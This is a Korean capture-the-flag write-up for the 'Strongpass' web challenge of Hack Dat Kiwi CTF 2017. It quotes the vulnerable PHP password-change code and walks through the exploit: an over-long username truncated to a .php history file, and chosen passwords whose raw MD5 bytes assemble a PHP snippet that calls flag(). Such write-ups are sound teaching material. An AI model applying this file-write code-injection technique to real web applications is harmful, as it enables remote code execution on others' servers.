# [WEB] Hack Dat Kiwi CTF 2017 - Strongpass

# Description

>   문제 페이지 닫힘

# Analysis

해당 문제는 소스가 주어졌다.

기능은 크게 4가지이며 회원 가입, 로그인, 로그아웃, 패스워드 변경이다.

해당 기능은 `user.php`에 정의되어 있다.

4가지의 기능 중, 로그인이나 로그아웃에서는 취약점이 발생하지 않을 것 같았고, 패스워드 변경에서는 취약점에 발생하게 좋게 생겼다.

패스워드 변경 함수의 소스를 보자

```php
function changepass($oldpass,$newpass)
{
	if (!isset($_SESSION['login'])) return false;
	$userid=$_SESSION['login']['id'];
	if (strlen($newpass)<8) return false;
	if (!sql("select * from users where id=? and password=?",$userid,md5($oldpass)))
		return false;
	if ($newpass===$oldpass) return false;
	function get_password_history()
	{
		$file=password_history_file();
		if (!file_exists($file))
			return [];
		else
			return explode(PHP_EOL,file_get_contents($file)); 
	}
	function password_history_file()
	{
		$username=$_SESSION['login']['username'];
		return realpath(__DIR__."/history")."/".substr("{$username}.pss",0,255);//filename length limit
	}
	//check if password not used before
	$hash=hex2bin(md5($newpass));
	$pass_history=get_password_history();
	foreach ($pass_history as $one_of_old_passes)
		if ($hash===$one_of_old_passes)
			return false;
	array_unshift($pass_history, $hash);
	file_put_contents(password_history_file(), implode(PHP_EOL,$pass_history));
	return sql("update users set password=? where id=?",md5($newpass),$userid);
}
```

우선 변경할 패스워드가 8자리 이상이고, 이전에 사용하지 않은 패스워드여야 변경이 된다.

변경했던 패스워드 내역은 ./history/유저네임.pss 안에 패스워드를 md5 해쉬한 값을 raw값으로 저장한다.

취약점은 이 부분에서 발생한다.

또한 config.php에 flag()함수를 호출하면 flag를 리턴해준다.

# Exploit

1. php command injection upload using changepass

## 1. php command injection using changepass

회원 가입할 때 아이디의 길이를 제한하지 않기 때문에 아이디를 255자보다 길게 가입이 가능하다.

`username=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.php`

아이디를 길게하면 패스워드 변경할 때 저장되는 파일이름을 .php로 저장하여 php를 실행할 수 있게 된다.

`/history/11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.php`

우리가 플래그를 얻기위해 php에 저장할 내용은 다음과 같다.

```php
<?
	$a=flag;
	$a();
?>
```

이제 md5의 raw값으로 php코드를 만들기 위해 다음 문자열로 시작하는 md5값을 구해보자.

1. \<?# : !wo352rgxkf8
2. \$a# : G14\$W41KER
3. =# : TCCU6IDENTTFD
4. f.# : Bvsycr9n9iwohnja
5. l.# : NIKF0RIDI5
6. a.# : 86dpqerat
7. g;# : dxvoowxIqS4E$
8. $a# : crs3t4bkedkwstf
9. ()# : HAGO580WBYKDLTIVP
10. ;# : Kfmrwgbmncahe
11. ?> : pb5wd26lqed4

변경한 패스워드는 파일에 저장되므로, 위 md5값이 나오는 패스워드를 `?>`부터 역순으로 변경한다.

그러면 최종적으로 아래와 같이 완성된다.

```php
<?#
  $a#
  =#
  f.#
  l.#
  a.#
  g;#
  $a#
  ()#
  ;#
?>
```

이제 패스워드가 저장된 파일인 `111...1.php`에 접속하면 flag를 얻을 수 있다.



